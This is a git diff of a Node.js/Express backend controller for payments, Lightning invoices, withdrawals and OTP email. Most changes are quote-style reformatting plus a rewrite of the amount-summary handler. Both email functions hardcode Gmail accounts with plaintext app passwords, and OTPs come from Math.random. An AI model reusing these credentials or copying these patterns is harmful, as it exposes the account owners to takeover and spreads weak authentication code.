     const ipadClickSum = await Click.aggregate([
       { $match: { posterId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalIpad: { $sum: '$ipad' } } }, // Sum desktop values
+      { $group: { _id: null, totalIpad: { $sum: "$ipad" } } }, // Sum desktop values
     ]);
 
     const totalDesktopClicks =
@@ -2344,13 +2339,13 @@ export const email_otp = async (req, res) => {
   const rand = Math.random().toString().substr(2, 6);
 
   const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    host: 'smtp.gmail.com',
+    service: "gmail",
+    host: "smtp.gmail.com",
     port: 587,
     secure: false,
     auth: {
-      user: 'ranaha199112@gmail.com',
-      pass: 'jzpp ypxn ywtr niog',
+      user: "ranaha199112@gmail.com",
+      pass: "jzpp ypxn ywtr niog",
       //   user: 'tonmoysamoi@gmail.com',
       //   pass:'theh cifb ffjc ogil',
     },
@@ -2358,11 +2353,11 @@ export const email_otp = async (req, res) => {
 
   const mailOptions = {
     from: {
-      name: 'Forget Password',
-      address: 'ranaha199112@gmail.com',
+      name: "Forget Password",
+      address: "ranaha199112@gmail.com",
     },
     to: email,
-    subject: 'Otp Check',
+    subject: "Otp Check",
     text: `Your Password OTP is ${rand}`,
   };
 
@@ -2375,9 +2370,9 @@ export const email_otp = async (req, res) => {
         otp: rand,
         username,
       });
-      return res.status(200).json({ success: 'Email sent' });
+      return res.status(200).json({ success: "Email sent" });
     }
-    return res.status(500).json({ error: 'not found' });
+    return res.status(500).json({ error: "not found" });
   } catch (error) {
     return res.status(500).json({ error: error });
   }
@@ -2401,7 +2396,7 @@ export const add_email = (req, res) => {
       }
 
       return res.status(200).json({ success: true });
-    }
+    },
   );
 };
 
@@ -2416,12 +2411,12 @@ export const email_add = async (req, res) => {
     if (userFound && !useremail) {
       userFound.email = email;
       await userFound.save();
-      return res.status(200).json({ success: 'changed succesfully' });
+      return res.status(200).json({ success: "changed succesfully" });
     }
 
-    return res.status(400).json({ e: 'user not found' });
+    return res.status(400).json({ e: "user not found" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -2430,13 +2425,13 @@ export const send_email = async (req, res) => {
   const rand = Math.random().toString().substr(2, 6);
 
   const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    host: 'smtp.gmail.com',
+    service: "gmail",
+    host: "smtp.gmail.com",
     port: 587,
     secure: false,
     auth: {
-      user: 'tonmoysamoi@gmail.com',
-      pass: 'theh cifb ffjc ogil',
+      user: "tonmoysamoi@gmail.com",
+      pass: "theh cifb ffjc ogil",
       // user: 'ranaha199112@gmail.com',
       // pass:'jzpp ypxn ywtr niog',
 
@@ -2449,20 +2444,20 @@ export const send_email = async (req, res) => {
 
   const mailOptions = {
     from: {
-      name: 'Test Email',
-      address: 'tonmoysamoi@gmail.com',
+      name: "Test Email",
+      address: "tonmoysamoi@gmail.com",
     },
     to: email,
     // cc: ['rana.buddy@gmail.com','emonabdullah445@gmail.com','simonahmed00775@gmail.com'],
-    subject: 'active ship management',
-    text: 'this email is from active ship management',
+    subject: "active ship management",
+    text: "this email is from active ship management",
     // html:templete
   };
 
   try {
     const info = await transporter.sendMail(mailOptions);
 
-    return res.status(200).json({ success: 'Email sent' });
+    return res.status(200).json({ success: "Email sent" });
   } catch (error) {
     console.log(error);
     return res.status(500).json({ error: error });
@@ -2492,7 +2487,9 @@ export const dynamic_link_get = async (req, res) => {
     const infos = await Info.find({ site: { $in: linkNames } });
 
     const posterIds = links.map((l) => l.root).filter(Boolean);
-    const posters = await Poster.find({ _id: { $in: posterIds } }).populate('root');
+    const posters = await Poster.find({ _id: { $in: posterIds } }).populate(
+      "root",
+    );
     const posterMap = new Map(posters.map((p) => [p._id.toString(), p]));
 
     const userIds = links.map((l) => l.root).filter(Boolean);
@@ -2523,22 +2520,22 @@ export const dynamic_link_get = async (req, res) => {
       if (poster) {
         lObj.owner = {
           name: poster.username,
-          email: poster.root?.email || '',
-          type: 'Reseller',
+          email: poster.root?.email || "",
+          type: "Reseller",
         };
       } else {
         const user = userMap.get(l.root?.toString());
         if (user) {
           lObj.owner = {
             name: user.username,
-            email: user.email || '',
-            type: 'User',
+            email: user.email || "",
+            type: "User",
           };
         } else {
           lObj.owner = {
-            name: 'Main account',
-            email: '',
-            type: 'Reseller',
+            name: "Main account",
+            email: "",
+            type: "Reseller",
           };
         }
       }
@@ -2565,80 +2562,141 @@ export const get_amount_summary = async (req, res) => {
   const { id } = req.params;
 
   try {
+    if (!id) {
+      return res.status(400).json({
+        error: "ID is required",
+      });
+    }
+
+    let query = {};
+    let type = "";
+
+    // =====================================================
+    // 1. Check if ID belongs to a Poster
+    // =====================================================
     const posterFound = await Poster.findOne({
       $or: [
-        { _id: id && id.length === 24 ? id : null },
         { posterId: id },
-        { username: id },
+        ...(id.length === 24 ? [{ _id: id }] : []),
       ],
-    }).populate('root');
-    let query = {};
+    });
+
     if (posterFound) {
-      const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
-        posterIds.push(posterFound.posterId);
-      }
-      if (posterFound.username) {
-        posterIds.push(posterFound.username);
-      }
+      type = "poster";
 
-      const posterCriteria = [
-        { root: posterFound._id },
-        { poster: { $in: posterIds } },
-      ];
-      if (posterFound.details && posterFound.details.length > 0) {
-        posterCriteria.push({ _id: { $in: posterFound.details } });
-      }
+      // Info.root directly references Poster._id
+      query = {
+        root: posterFound._id,
+        status: true,
+      };
 
-      const adminIdVal = posterFound.root?.adminId || posterFound.root?.username;
-      const baseConditions = [{ $or: posterCriteria }];
-      if (posterFound.links && posterFound.links.length > 0 && adminIdVal) {
-        baseConditions.push({
-          $and: [
-            { adminId: adminIdVal },
-            { site: { $in: posterFound.links } },
-          ],
-        });
-      }
-
-      query = { $or: baseConditions };
+      console.log("=================================");
+      console.log("TYPE: POSTER");
+      console.log("Poster _id:", posterFound._id.toString());
+      console.log("Poster posterId:", posterFound.posterId);
+      console.log("Query:", query);
+      console.log("=================================");
     } else {
+      // =====================================================
+      // 2. Check if ID belongs to User/Admin
+      // =====================================================
       const userFound = await User.findOne({
         $or: [
           { adminId: id },
           { username: id },
-          { _id: id && id.length === 24 ? id : null },
+          ...(id.length === 24 ? [{ _id: id }] : []),
         ],
       });
+
       if (!userFound) {
-        return res.status(400).json({ error: 'User or Poster not found' });
+        return res.status(404).json({
+          error: "User or Poster not found",
+        });
       }
-      query = { adminId: userFound.adminId };
+
+      // =====================================================
+      // 3. Admin
+      // =====================================================
+      if (userFound.admin === true) {
+        type = "admin";
+
+        // IMPORTANT:
+        // Admin's Info documents are connected through adminId,
+        // NOT through root.
+        query = {
+          adminId: userFound.adminId,
+          status: true,
+        };
+
+        console.log("=================================");
+        console.log("TYPE: ADMIN");
+        console.log("User _id:", userFound._id.toString());
+        console.log("Admin ID:", userFound.adminId);
+        console.log("Query:", query);
+        console.log("=================================");
+      } else {
+        // =====================================================
+        // 4. Normal User
+        // =====================================================
+        type = "user";
+
+        const posterIds = userFound.posters || [];
+
+        query = {
+          root: {
+            $in: posterIds,
+          },
+          status: true,
+        };
+
+        console.log("=================================");
+        console.log("TYPE: USER");
+        console.log("User _id:", userFound._id.toString());
+        console.log("Posters:", posterIds);
+        console.log("Query:", query);
+        console.log("=================================");
+      }
     }
 
-    const infos = await Info.find(query).select('amount status');
+    // =====================================================
+    // 5. Get verified Info records
+    // =====================================================
+    const infos = await Info.find(query)
+      .select("amount status adminId poster root")
+      .lean();
+
+    console.log("Type:", type);
+    console.log("Verified infos:", infos.length);
+
+    // =====================================================
+    // 6. Calculate verified total
+    // =====================================================
     let total = 0;
+
     infos.forEach((info) => {
-      if (info.amount) {
-        const val = parseFloat(info.amount);
-        if (!isNaN(val)) {
-          const status = info.status;
-          if (
-            status === true ||
-            status === 'true' ||
-            status === 'paid' ||
-            status === 'success' ||
-            status === 'successful'
-          ) {
-            total += val;
-          }
-        }
+      const amount = parseFloat(info.amount);
+
+      if (!Number.isNaN(amount)) {
+        total += amount;
       }
     });
 
-    return res.status(200).json({ total });
-  } catch (e) {
-    return res.status(400).json({ error: e.message });
+    console.log("Verified total:", total);
+
+    // =====================================================
+    // 7. Response
+    // =====================================================
+    return res.status(200).json({
+      type,
+      total,
+      count: infos.length,
+    });
+  } catch (error) {
+    console.error("get_amount_summary error:", error);
+
+    return res.status(400).json({
+      error: error.message,
+    });
   }
 };
 
@@ -2646,7 +2704,7 @@ export const get_amount_list = async (req, res) => {
   const { id } = req.params;
   const page = parseInt(req.query.page) || 1;
   const pageSize = parseInt(req.query.pageSize) || 20;
-  const filter = req.query.filter || '';
+  const filter = req.query.filter || "";
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
@@ -2656,7 +2714,7 @@ export const get_amount_list = async (req, res) => {
     let query = {};
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
+      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
         posterIds.push(posterFound.posterId);
       }
       query = { poster: { $in: posterIds } };
@@ -2669,16 +2727,16 @@ export const get_amount_list = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: 'User or Poster not found' });
+        return res.status(400).json({ error: "User or Poster not found" });
       }
       query = { adminId: userFound.adminId };
     }
 
     if (filter) {
       query.$or = [
-        { site: { $regex: filter, $options: 'i' } },
-        { email: { $regex: filter, $options: 'i' } },
-        { amount: { $regex: filter, $options: 'i' } },
+        { site: { $regex: filter, $options: "i" } },
+        { email: { $regex: filter, $options: "i" } },
+        { amount: { $regex: filter, $options: "i" } },
       ];
     }
 
@@ -2693,9 +2751,9 @@ export const get_amount_list = async (req, res) => {
     const total = await Info.countDocuments(query);
     const infos = await Info.find(query)
       .select(
-        'site email amount createdAt adminId poster root status lightningInvoice rHash'
+        "site email amount createdAt adminId poster root status lightningInvoice rHash",
       )
-      .populate('root', 'username')
+      .populate("root", "username")
       .sort(sort)
       .skip((page - 1) * pageSize)
       .limit(pageSize);
@@ -2719,20 +2777,20 @@ export const check_payment_status = async (req, res) => {
   try {
     const info = await Info.findById(infoId);
     if (!info) {
-      return res.status(404).json({ error: 'Info record not found' });
+      return res.status(404).json({ error: "Info record not found" });
     }
 
     if (!info.rHash) {
       return res
         .status(400)
-        .json({ error: 'No lightning invoice associated with this record' });
+        .json({ error: "No lightning invoice associated with this record" });
     }
 
     const nwcInstance = getNwc();
     if (nwcInstance) {
       try {
         console.log(
-          `[Alby NWC] Checking status for invoice with hash: ${info.rHash}`
+          `[Alby NWC] Checking status for invoice with hash: ${info.rHash}`,
         );
         const lookup = await nwcInstance.lookupInvoice({
           paymentHash: info.rHash,
@@ -2751,14 +2809,14 @@ export const check_payment_status = async (req, res) => {
             .json({ success: false, status: info.status || false, info });
         }
       } catch (albyErr) {
-        console.error('Alby NWC lookupInvoice failed:', albyErr.message);
+        console.error("Alby NWC lookupInvoice failed:", albyErr.message);
         return res.status(500).json({ error: albyErr.message });
       }
     } else {
-      return res.status(500).json({ error: 'Alby NWC is not initialized' });
+      return res.status(500).json({ error: "Alby NWC is not initialized" });
     }
   } catch (error) {
-    console.error('Verify payment failed:', error.message);
+    console.error("Verify payment failed:", error.message);
     return res.status(500).json({ error: error.message });
   }
 };
@@ -2773,12 +2831,12 @@ export const get_withdraw_summary = async (req, res) => {
         { posterId: id },
         { username: id },
       ],
-    }).populate('root');
+    }).populate("root");
     let query = {};
     let userId = id;
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
+      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
         posterIds.push(posterFound.posterId);
       }
       if (posterFound.username) {
@@ -2793,14 +2851,12 @@ export const get_withdraw_summary = async (req, res) => {
         posterCriteria.push({ _id: { $in: posterFound.details } });
       }
 
-      const adminIdVal = posterFound.root?.adminId || posterFound.root?.username;
+      const adminIdVal =
+        posterFound.root?.adminId || posterFound.root?.username;
       const baseConditions = [{ $or: posterCriteria }];
       if (posterFound.links && posterFound.links.length > 0 && adminIdVal) {
         baseConditions.push({
-          $and: [
-            { adminId: adminIdVal },
-            { site: { $in: posterFound.links } },
-          ],
+          $and: [{ adminId: adminIdVal }, { site: { $in: posterFound.links } }],
         });
       }
 
@@ -2815,13 +2871,15 @@ export const get_withdraw_summary = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: 'User or Poster not found' });
+        return res.status(400).json({ error: "User or Poster not found" });
       }
       query = { adminId: userFound.adminId };
       userId = userFound._id.toString();
     }
 
-    const infos = await Info.find(query).select('amount status poster root site');
+    const infos = await Info.find(query).select(
+      "amount status poster root site",
+    );
     let totalAmount = 0;
     let paidAmount = 0;
     let adminManualPaidAmount = 0;
@@ -2836,18 +2894,18 @@ export const get_withdraw_summary = async (req, res) => {
           const status = info.status;
           if (
             status === true ||
-            status === 'true' ||
-            status === 'paid' ||
-            status === 'success' ||
-            status === 'successful'
+            status === "true" ||
+            status === "paid" ||
+            status === "success" ||
+            status === "successful"
           ) {
             paidAmount += val;
-            if (info.site === 'manual-qr') {
+            if (info.site === "manual-qr") {
               manualPaidAmount += val;
             } else {
               autoPaidAmount += val;
             }
-            if (!info.root && (!info.poster || info.poster === '')) {
+            if (!info.root && (!info.poster || info.poster === "")) {
               adminManualPaidAmount += val;
             }
           }
@@ -2871,18 +2929,18 @@ export const get_withdraw_summary = async (req, res) => {
     let pendingWithdraw = 0;
     let lastWithdraw = 0;
 
-    const approvedWithdraws = withdraws.filter((w) => w.status === 'approved');
+    const approvedWithdraws = withdraws.filter((w) => w.status === "approved");
     if (approvedWithdraws.length > 0) {
       approvedWithdraws.sort((a, b) => b.createdAt - a.createdAt);
       lastWithdraw = approvedWithdraws[0].amount;
       totalWithdrawn = approvedWithdraws.reduce(
         (acc, curr) => acc + curr.amount,
-        0
+        0,
       );
     }
 
     pendingWithdraw = withdraws
-      .filter((w) => w.status === 'pending')
+      .filter((w) => w.status === "pending")
       .reduce((acc, curr) => acc + curr.amount, 0);
 
     const availableAmount = paidAmount - totalWithdrawn - pendingWithdraw;
@@ -2914,7 +2972,7 @@ export const request_withdraw = async (req, res) => {
         { posterId: id },
         { username: id },
       ],
-    }).populate('root');
+    }).populate("root");
     let userId = id;
     let rootId = null;
     let query = {};
@@ -2922,7 +2980,7 @@ export const request_withdraw = async (req, res) => {
       userId = posterFound._id.toString();
       rootId = posterFound.root?._id || posterFound.root;
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
+      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
         posterIds.push(posterFound.posterId);
       }
       if (posterFound.username) {
@@ -2937,14 +2995,12 @@ export const request_withdraw = async (req, res) => {
         posterCriteria.push({ _id: { $in: posterFound.details } });
       }
 
-      const adminIdVal = posterFound.root?.adminId || posterFound.root?.username;
+      const adminIdVal =
+        posterFound.root?.adminId || posterFound.root?.username;
       const baseConditions = [{ $or: posterCriteria }];
       if (posterFound.links && posterFound.links.length > 0 && adminIdVal) {
         baseConditions.push({
-          $and: [
-            { adminId: adminIdVal },
-            { site: { $in: posterFound.links } },
-          ],
+          $and: [{ adminId: adminIdVal }, { site: { $in: posterFound.links } }],
         });
       }
 
@@ -2958,14 +3014,14 @@ export const request_withdraw = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: 'User or Poster not found' });
+        return res.status(400).json({ error: "User or Poster not found" });
       }
       userId = userFound._id.toString();
       rootId = userFound.adminId;
       query = { adminId: userFound.adminId };
     }
 
-    const infos = await Info.find(query).select('amount status');
+    const infos = await Info.find(query).select("amount status");
     let paidAmount = 0;
 
     infos.forEach((info) => {
@@ -2975,10 +3031,10 @@ export const request_withdraw = async (req, res) => {
           const status = info.status;
           if (
             status === true ||
-            status === 'true' ||
-            status === 'paid' ||
-            status === 'success' ||
-            status === 'successful'
+            status === "true" ||
+            status === "paid" ||
+            status === "success" ||
+            status === "successful"
           ) {
             paidAmount += val;
           }
@@ -2991,9 +3047,9 @@ export const request_withdraw = async (req, res) => {
     let pendingWithdraw = 0;
 
     withdraws.forEach((w) => {
-      if (w.status === 'approved') {
+      if (w.status === "approved") {
         totalWithdrawn += w.amount;
-      } else if (w.status === 'pending') {
+      } else if (w.status === "pending") {
         pendingWithdraw += w.amount;
       }
     });
@@ -3001,14 +3057,14 @@ export const request_withdraw = async (req, res) => {
     const availableAmount = paidAmount - totalWithdrawn - pendingWithdraw;
 
     if (amount > availableAmount) {
-      return res.status(400).json({ error: 'Insufficient available balance' });
+      return res.status(400).json({ error: "Insufficient available balance" });
     }
 
     const newWithdraw = await Withdraw.create({
       userId,
       rootId,
       amount,
-      status: 'pending',
+      status: "pending",
     });
 
     return res.status(200).json({ success: true, data: newWithdraw });
@@ -3042,7 +3098,7 @@ export const get_withdraw_list = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: 'User or Poster not found' });
+        return res.status(400).json({ error: "User or Poster not found" });
       }
       withdraws = await Withdraw.find({
         $or: [
@@ -3066,7 +3122,7 @@ export const update_withdraw_status = async (req, res) => {
   try {
     const withdraw = await Withdraw.findById(withdrawId);
     if (!withdraw) {
-      return res.status(404).json({ error: 'Withdraw not found' });
+      return res.status(404).json({ error: "Withdraw not found" });
     }
 
     withdraw.status = status;
@@ -3092,8 +3148,8 @@ export const create_manual_qrcode = async (req, res) => {
         $or: [
           { adminId: id },
           { username: id },
-          { _id: id && id.length === 24 ? id : null }
-        ]
+          { _id: id && id.length === 24 ? id : null },
+        ],
       });
       if (!adminFound) {
         return res.status(400).json({ error: "Admin user not found" });
@@ -3104,9 +3160,9 @@ export const create_manual_qrcode = async (req, res) => {
         $or: [
           { posterId: id },
           { username: id },
-          { _id: id && id.length === 24 ? id : null }
-        ]
-      }).populate('root');
+          { _id: id && id.length === 24 ? id : null },
+        ],
+      }).populate("root");
       if (!posterRecord) {
         return res.status(400).json({ error: "Poster not found" });
       }
@@ -3129,32 +3185,41 @@ export const create_manual_qrcode = async (req, res) => {
       try {
         const internalAmount = getInternalAmount(amount);
         const numericAmount = await getSatoshis(
-          String(internalAmount).replace(/[^0-9.]/g, '')
+          String(internalAmount).replace(/[^0-9.]/g, ""),
         );
         if (numericAmount > 0) {
           const albyResponse = await nwcInstance.makeInvoice({
-            amount: numericAmount
+            amount: numericAmount,
           });
           if (albyResponse && albyResponse.paymentRequest) {
             info.lightningInvoice = albyResponse.paymentRequest;
 
             try {
-              const txs = await nwcInstance.listTransactions({ limit: 10, unpaid: true });
+              const txs = await nwcInstance.listTransactions({
+                limit: 10,
+                unpaid: true,
+              });
               if (txs && txs.transactions) {
                 const matchedTx = txs.transactions.find(
-                  (tx) => tx.invoice === albyResponse.paymentRequest
+                  (tx) => tx.invoice === albyResponse.paymentRequest,
                 );
                 if (matchedTx && matchedTx.payment_hash) {
                   info.rHash = matchedTx.payment_hash;
                 }
               }
             } catch (txErr) {
-              console.error('[Alby NWC] Failed to list transactions in manual create:', txErr.message);
+              console.error(
+                "[Alby NWC] Failed to list transactions in manual create:",
+                txErr.message,
+              );
             }
           }
         }
       } catch (albyErr) {
-        console.error('Alby NWC Invoice creation failed in manual create:', albyErr.message);
+        console.error(
+          "Alby NWC Invoice creation failed in manual create:",
+          albyErr.message,
+        );
       }
     }
 
@@ -3178,7 +3243,7 @@ export const toggle_fee_on = async (req, res) => {
     return res.status(200).json({
       success: true,
       enabled: currentState,
-      message: 'Internal range fee addition is now TURNED ON',
+      message: "Internal range fee addition is now TURNED ON",
     });
   } catch (e) {
     return res.status(400).json({ error: e.message });
@@ -3191,7 +3256,8 @@ export const toggle_fee_off = async (req, res) => {
     return res.status(200).json({
       success: true,
       enabled: currentState,
-      message: 'Internal range fee addition is now TURNED OFF (using regular amount)',
+      message:
+        "Internal range fee addition is now TURNED OFF (using regular amount)",
     });
   } catch (e) {
     return res.status(400).json({ error: e.message });
@@ -3204,7 +3270,7 @@ export const toggle_fee_status = async (req, res) => {
     return res.status(200).json({
       success: true,
       enabled: currentState,
-      message: `Internal range fee addition is currently ${currentState ? 'ON' : 'OFF'}`,
+      message: `Internal range fee addition is currently ${currentState ? "ON" : "OFF"}`,
     });
   } catch (e) {
     return res.status(400).json({ error: e.message });
@@ -3220,7 +3286,13 @@ export const set_permission_invoice1 = async (req, res) => {
     check.lightningInvoice = true;
     check.lightningInvoice2 = false;
     await check.save();
-    return res.status(200).json({ success: true, message: "Invoice 1 set to true, Invoice 2 set to false", data: check });
+    return res
+      .status(200)
+      .json({
+        success: true,
+        message: "Invoice 1 set to true, Invoice 2 set to false",
+        data: check,
+      });
   } catch (error) {
     console.error("Error setting invoice1 permission:", error);
     return res.status(400).json({ success: false, error: error.message });
@@ -3236,7 +3308,13 @@ export const set_permission_invoice2 = async (req, res) => {
     check.lightningInvoice = false;
     check.lightningInvoice2 = true;
     await check.save();
-    return res.status(200).json({ success: true, message: "Invoice 1 set to false, Invoice 2 set to true", data: check });
+    return res
+      .status(200)
+      .json({
+        success: true,
+        message: "Invoice 1 set to false, Invoice 2 set to true",
+        data: check,
+      });
   } catch (error) {
     console.error("Error setting invoice2 permission:", error);
     return res.status(400).json({ success: false, error: error.message });
@@ -3250,7 +3328,10 @@ export const get_permission = async (req, res) => {
       check = new CheckPermission();
       await check.save();
     }
-    const activeInvoice = check.lightningInvoice2 === true ? "lightningInvoice2" : "lightningInvoice";
+    const activeInvoice =
+      check.lightningInvoice2 === true
+        ? "lightningInvoice2"
+        : "lightningInvoice";
     return res.status(200).json({ success: true, activeInvoice, data: check });
   } catch (error) {
     console.error("Error getting permission configuration:", error);
